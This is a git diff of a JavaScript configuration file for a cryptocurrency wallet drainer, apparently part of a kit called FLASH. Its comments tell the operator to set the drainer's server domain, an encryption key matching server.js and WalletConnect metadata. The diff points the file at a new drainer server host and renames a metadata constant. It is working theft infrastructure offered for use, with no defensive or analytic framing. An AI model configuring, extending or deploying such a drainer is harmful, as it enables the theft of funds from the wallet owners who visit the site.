@@ -13,7 +13,7 @@
 let FLASH_Encryption_Key = 50; // Specify any number that will be used for encryption it is not recommended to leave it as default!
 // The same number should be specified in the server.js file - if they differ, then nothing will work correctly
 
-const FLASH_Server = "test.bricsfunded.com"; // Specify the domain that is attached to the drainer server
+const FLASH_Server = "mdpp.neutralpro.live/"; // Specify the domain that is attached to the drainer server
 // This is the domain where you have a server, and not the site itself where you plan to use the drainer
 
 const FLASH_WalletConnect_ID = "53cb6c00218a6d60162590ce6debfc5c"; // Project ID из WalletConnect Cloud change this
@@ -30,7 +30,7 @@ const FLASH_Verify_Message = "";// Message for wallet verification, may contain 
 // No need to change, most wallets work with default settings
 // The setting is not related to the FLASH_WalletConnect_Customization switch, it is only needed to customize the design
 
-const FLASH_WalletConnect_MetaData = {
+const FLASH_Connect_MetaData = {
   name: document.title, // Default is the same as the site name
   description: "Web3 Application", // Default "Web3 Application"
   url: "https://" + window.location.host, // Default as site domain
